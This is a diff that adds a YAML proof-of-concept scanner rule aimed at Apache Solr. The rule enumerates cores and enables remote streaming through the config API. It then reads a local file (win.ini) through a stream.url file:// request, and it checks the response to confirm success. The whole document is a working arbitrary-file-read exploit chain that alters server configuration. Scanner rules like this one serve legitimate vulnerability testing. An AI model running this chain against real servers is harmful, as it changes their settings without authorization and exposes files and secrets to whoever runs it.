@@ -1,0 +1,25 @@
+name: poc-yaml-solr-fileread2
+rules:
+  - method: GET
+    path: "/solr/admin/cores?indexInfo=false&wt=json"
+    expression: "true"
+    search: >-
+      "name":"(?P<core>.+?)"
+  - method: POST
+    path: "/solr/{{core}}/config"
+    body: |
+      {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+    expression: |
+      response.body.bcontains(b"responseHeader")
+  - method: POST
+    path: "/solr/{{core}}/debug/dump?param=ContentStreams"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      stream.url=file:///c://windows/win.ini
+    expression: |
+      response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+detail:
+  author: whami-root(https://github.com/whami-root)
+  links:
+    - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186
